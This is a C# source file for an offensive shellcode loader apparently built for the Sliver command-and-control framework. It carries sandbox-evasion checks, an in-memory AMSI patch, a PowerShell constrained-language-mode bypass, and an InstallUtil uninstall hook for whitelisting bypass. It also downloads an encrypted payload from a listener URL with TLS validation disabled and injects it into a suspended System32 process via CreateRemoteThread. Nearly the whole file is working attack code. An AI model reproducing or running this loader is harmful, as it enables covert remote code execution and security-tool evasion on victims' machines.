using System;
using System.IO;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Linq;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Management.Automation.Host;
using System.Runtime.Remoting.Contexts;
using System.IO.Compression;
using System.Net;
using System.Security.Cryptography;
using System.Diagnostics;

namespace SliverBypassLoader
{
    class altbypass
    {
        [StructLayout(LayoutKind.Sequential)]
        public class SecurityAttributes
        {
            public Int32 Length = 0;
            public IntPtr lpSecurityDescriptor = IntPtr.Zero;
            public bool bInheritHandle = false;

            public SecurityAttributes()
            {
                this.Length = Marshal.SizeOf(this);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessInformation
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 dwProcessId;
            public Int32 dwThreadId;
        }
        [Flags]
        public enum CreateProcessFlags : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
        }


        [StructLayout(LayoutKind.Sequential)]
        public class StartupInfo
        {
            public Int32 cb = 0;
            public IntPtr lpReserved = IntPtr.Zero;
            public IntPtr lpDesktop = IntPtr.Zero;
            public IntPtr lpTitle = IntPtr.Zero;
            public Int32 dwX = 0;
            public Int32 dwY = 0;
            public Int32 dwXSize = 0;
            public Int32 dwYSize = 0;
            public Int32 dwXCountChars = 0;
            public Int32 dwYCountChars = 0;
            public Int32 dwFillAttribute = 0;
            public Int32 dwFlags = 0;
            public Int16 wShowWindow = 0;
            public Int16 cbReserved2 = 0;
            public IntPtr lpReserved2 = IntPtr.Zero;
            public IntPtr hStdInput = IntPtr.Zero;
            public IntPtr hStdOutput = IntPtr.Zero;
            public IntPtr hStdError = IntPtr.Zero;
            public StartupInfo()
            {
                this.cb = Marshal.SizeOf(this);
            }
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags,
                IntPtr lpEnvironment,
                String lpCurrentDirectory,
                [In] StartupInfo lpStartupInfo,
                out ProcessInformation lpProcessInformation

            );

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)] 
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)] 
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")] 
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")] 
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 MEM_COMMIT = 0x1000;
        private static int PROCESS_VM_OPERATION = 0x0008;
        private static int PROCESS_VM_READ = 0x0010;
        private static int PROCESS_VM_WRITE = 0x0020;

        public static void Main(string[] args)
        {
            // Parse args
            string listenerUrl = "", compressAlgorithm = "", targetBinary = "", aesKey = "", aesIv = "";
            if (args != null && 
                args.Length > 0 && 
                !string.IsNullOrEmpty(args[0]) && 
                !string.IsNullOrEmpty(args[1]) && 
                !string.IsNullOrEmpty(args[2]) && 
                !string.IsNullOrEmpty(args[3]) && 
                !string.IsNullOrEmpty(args[4]))
            {
                listenerUrl = args[0];
                targetBinary = args[1];
                compressAlgorithm = args[2];
                aesKey = args[3];
                aesIv = args[4];
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result != 0xFFFFFFFF)
            {
                return;
            }

            Bypass();

            Char a1, a2, a3, a4, a5;
            a1 = 'y';
            a2 = 'g';
            a3 = 'u';
            a4 = 'o';
            a5 = 't';
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            // Get ptr to System.Management.AutomationSecurity.SystemPolicy.GetSystemLockdownPolicy
            var get_l_info = Automation.GetType("S" + a1 + "stem.Mana" + a2 + "ement.Au" + a5 + "oma" + a5 + "ion.Sec" + a3 + "rity.S" + a1 + "stemP" + a4 + "licy").GetMethod("GetS" + a1 + "stemL" + a4 + "ckdownP" + a4 + "licy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            var get_l_handle = get_l_info.MethodHandle;
            uint lpflOldProtect;
            RuntimeHelpers.PrepareMethod(get_l_handle);
            var get_l_ptr = get_l_handle.GetFunctionPointer();

            // make the System.Management.AutomationSecurity.SystemPolicy.GetSystemLockdownPolicy VM Page writable & overwrite the first 4 bytes
            VirtualProtect(get_l_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);
            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_l_ptr, 4);

            DownloadAndExecute(listenerUrl, targetBinary, compressAlgorithm, aesKey, aesIv);
        }
        static int Bypass()
        {
            byte patch = 0xEB;

            IntPtr hHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, Process.GetCurrentProcess().Id);
            if (hHandle != IntPtr.Zero)
            {
                Console.WriteLine("[+] Process opened with Handle ~> " + hHandle);
            }

            IntPtr amsiDLL = LoadLibrary("amsi.dll");
            if (amsiDLL != IntPtr.Zero)
            {
                Console.WriteLine("[+] amsi.dll located at ~> " + amsiDLL);
            }

            IntPtr amsiOpenSession = GetProcAddress(amsiDLL, "AmsiOpenSession");
            if (amsiOpenSession != IntPtr.Zero)
            {
                Console.WriteLine("[+] AmsiOpenSession located at ~> " + amsiOpenSession);
            }

            IntPtr patchAddr = (IntPtr)(amsiOpenSession.ToInt64() + 3);
            Console.WriteLine("[+] Trying to Inject ~> " + patchAddr);

            int bytesWritten = 0;
            bool result = WriteProcessMemory(hHandle, patchAddr, new byte[] { patch }, 1, out bytesWritten);
            if (result)
            {
                Console.WriteLine("[!] Process Memory Injected!");
            }

            CloseHandle(hHandle);
            return 0;
        }
        public static void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, string aeskey, string aesiv)
        {
            byte[] AESKey = Encoding.ASCII.GetBytes(aeskey);
            byte[] AESIV = Encoding.ASCII.GetBytes(aesiv);

            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new WebClientWithTimeout();

            byte[] encrypted = client.DownloadData(url);
            List<byte> l = new List<byte> { };
            byte[] actual;
            byte[] compressed;

            if (AESKey != null && AESIV != null)
            {


                for (int i = 16; i <= encrypted.Length - 1; i++)
                {
                    l.Add(encrypted[i]);

                }
                actual = l.ToArray();
                compressed = Decrypt(actual, AESKey, AESIV);
            }
            else
            {
                compressed = encrypted;
            }

            byte[] sc = Decompress(compressed, CompressionAlgorithm);
            string binary = TargetBinary;

            Int32 size = sc.Length;
            StartupInfo sInfo = new StartupInfo();
            sInfo.dwFlags = 0;
            ProcessInformation pInfo;
            string binaryPath = "C:\\Windows\\System32\\" + binary;

            IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
            IntPtr hProcess = pInfo.hProcess;
            IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            int test = 0;
            IntPtr size2 = new IntPtr(sc.Length);
            bool bWrite = WriteProcessMemory(hProcess, spaceAddr, sc, size2, test);
            CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
            return;
        }
        public static byte[] Decompress(byte[] data, string CompressionAlgorithm)
        {
            byte[] decompressedArray = null;
            if (CompressionAlgorithm == "deflate9")
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (MemoryStream compressStream = new MemoryStream(data))
                    {
                        using (DeflateStream deflateStream = new DeflateStream(compressStream, CompressionMode.Decompress))
                        {
                            deflateStream.CopyTo(decompressedStream);
                        }
                    }
                    decompressedArray = decompressedStream.ToArray();
                }
                return decompressedArray;
            }
            else if (CompressionAlgorithm == "gzip")
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (MemoryStream compressStream = new MemoryStream(data))
                    {
                        using (GZipStream gzipStream = new GZipStream(compressStream, CompressionMode.Decompress))
                        {
                            gzipStream.CopyTo(decompressedStream);
                        }
                    }
                    decompressedArray = decompressedStream.ToArray();
                }
                return decompressedArray;
            }
            else
            {
                return data;
            }
        }
        public static byte[] Decrypt(byte[] ciphertext, byte[] AESKey, byte[] AESIV)
        {
            byte[] key = AESKey;
            byte[] IV = AESIV;

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        return memoryStream.ToArray();
                    }
                }
            }
        }
        public class WebClientWithTimeout : WebClient
        {
            protected override WebRequest GetWebRequest(Uri address)
            {
                WebRequest wr = base.GetWebRequest(address);
                wr.Timeout = 50000000; // timeout in milliseconds (ms)
                return wr;
            }
        }
    }

    // InstallUtill uninstall bypass
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string listenerUrl = this.Context.Parameters["listenerUrl"];
            string compressAlgorithm = this.Context.Parameters["compressAlgorithm"];
            string targetBinary = this.Context.Parameters["targetBinary"];
            string aesKey = this.Context.Parameters["aesKey"];
            string aesIv = this.Context.Parameters["aesIv"];

            if (listenerUrl == null)
            {
                throw new InstallException("Mandatory parameter 'listenerUrl' is missing");
            }

            if (compressAlgorithm == null)
            {
                compressAlgorithm = "";
            }

            if (targetBinary == null)
            {
                throw new InstallException("Mandatory parameter 'targetBinary' is missing");
            }

            if (aesKey == null)
            {
                throw new InstallException("Mandatory parameter 'aesKey' is missing");
            }

            if (aesIv == null)
            {
                throw new InstallException("Mandatory parameter 'aesIv' is missing");
            }

            string[] args = new string[] { listenerUrl, targetBinary, compressAlgorithm, aesKey, aesIv };
            altbypass.Main(args);
        }
    }
}
